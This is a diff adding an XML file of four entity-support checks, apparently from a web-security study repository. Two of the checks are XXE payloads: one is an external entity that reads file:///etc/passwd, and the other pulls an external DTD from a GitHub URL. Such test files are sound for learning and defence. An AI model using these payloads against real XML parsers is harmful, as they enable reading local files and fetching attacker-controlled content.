@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+    <!ENTITY internal_gen "Internal General: SUPPORTED">
+]>
+<results>
+    <check>&internal_gen;</check>
+</results>
+
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+    <!ENTITY % intparam "<!ENTITY shortcut 'Internal Parameter: SUPPORTED'>">
+    %intparam;
+]>
+<results>
+    <check>&shortcut;</check>
+</results>
+
+
+
+<!-- External General Entities -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+    <!ENTITY external_gen SYSTEM "file:///etc/passwd">
+]>
+<results>
+    <check>&external_gen;</check>
+</results>
+
+<!-- External Parameter Entities -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test SYSTEM "https://raw.githubusercontent.com/NMahesh20/back-to-college/refs/heads/main/web-sec/xml/payload.xml">
+<results>
+    <check>&all;</check>
+</results>
